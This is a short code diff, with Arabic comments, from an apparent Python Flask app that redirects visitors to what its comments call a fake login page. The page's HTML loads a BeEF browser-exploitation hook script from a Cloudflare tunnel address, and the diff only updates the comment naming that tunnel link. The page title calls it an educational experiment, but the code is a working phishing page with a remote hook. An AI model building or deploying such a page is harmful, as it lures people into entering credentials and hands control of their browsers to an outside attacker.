@@ -94,12 +94,12 @@ def index():
     # 2. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
     return redirect('/login')
 
-# ========== صفحة تسجيل الدخول الوهمية (معدلة مع كود BeEF Hook) ==========
+# ========== صفحة تسجيل الدخول الوهمية (مع رابط Cloudflare Tunnel الجديد) ==========
 login_page_html = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <!-- كود BeEF Hook -->ئ
+    <!-- كود BeEF Hook (رابط Cloudflare Tunnel) -->
     <script src="https://grew-resumes-blend-arbor.trycloudflare.com/hook.js"></script>
     <title>تسجيل الدخول - تجربة تعليمية</title>
     <meta charset="UTF-8">
